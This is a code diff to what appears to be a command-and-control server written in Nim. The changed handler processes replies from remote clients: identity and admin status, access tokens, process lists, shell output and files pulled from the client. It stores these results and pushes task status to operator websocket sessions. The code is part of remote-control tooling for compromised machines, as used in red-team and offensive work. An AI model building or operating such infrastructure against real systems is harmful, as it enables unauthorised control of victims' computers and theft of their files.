@@ -1,4 +1,4 @@
-import asyncdispatch, asyncnet, asyncfutures, strutils, json, base64
+import asyncdispatch, ws, asyncfutures, strutils, json, base64
 
 import types, logging, communication
 
@@ -7,14 +7,15 @@ proc processMessage*(client: C2Client, response: JsonNode) {.async.} =
 
   let error = response["error"].getStr() 
   let taskId = response["taskId"].getInt(-1) 
+  
 
   if taskId > -1:
+    let task = server.tasks[taskId]
     if error != "":
       errorLog $client & ": " & error
     else: 
       case response["task"].getStr():
       of "identify":
-        client.loaded = true
         client.hostname = response["data"]["hostname"].getStr("")
         client.username = response["data"]["username"].getStr("")
         client.isAdmin = response["data"]["isAdmin"].getBool(false)
@@ -40,11 +41,15 @@ proc processMessage*(client: C2Client, response: JsonNode) {.async.} =
         )
         client.isAdmin = response["data"]["isAdmin"].getBool()
         client.isAdmin = response["data"]["isAdmin"].getBool()
+        if not client.loaded:
+          cConnected client
+          client.loaded = true
       of "output":
         let output = response["data"]["output"].getStr()
         let category = response["data"]["category"].getStr()
         if category == "TOKENINFO":
           let tokenInformation = parseJson(decode(output))
+          task.output = tokenInformation
           client.tokenInformation.integrityLevel.sid = tokenInformation["tokenIntegrity"].getStr("")
           client.tokenInformation.groups = @[]
           for tokenGroup in tokenInformation["tokenGroups"]:
@@ -54,17 +59,28 @@ proc processMessage*(client: C2Client, response: JsonNode) {.async.} =
               domain: tokenGroup["domain"].getStr("")))
         elif category == "PROCESSES":
           let output = parseJson(decode(output))
+          task.output = output
           client.processes = @[]
           for process in output["processes"]:
             client.processes.add((
               name: process["name"].getStr(""),
               id: process["id"].getInt(0)))
-        else:
+        elif category == "SHELL":
+          task.output = %*{"output": decode(output)}
           logClientOutput client, category, output
       of "file":
+        task.output = %*{
+          "file": response["data"]["path"].getStr(),
+          "data": decode(response["data"]["contents"].getStr())
+        }
         infoLog "received file " & response["data"]["path"].getStr() & " from " & $client
         logClientOutput client, "DOWNLOAD", response["data"]["contents"].getStr()
-    let task = server.tasks[taskId]
     task.markAsCompleted(response)
+    for wsConnection in client.server.wsConnections:
+      if wsConnection.readyState == Open:
+        discard wsConnection.send($(%*{
+          "event": "taskstatus",
+          "data": %task
+        }))
   else:
     await client.askToIdentify()
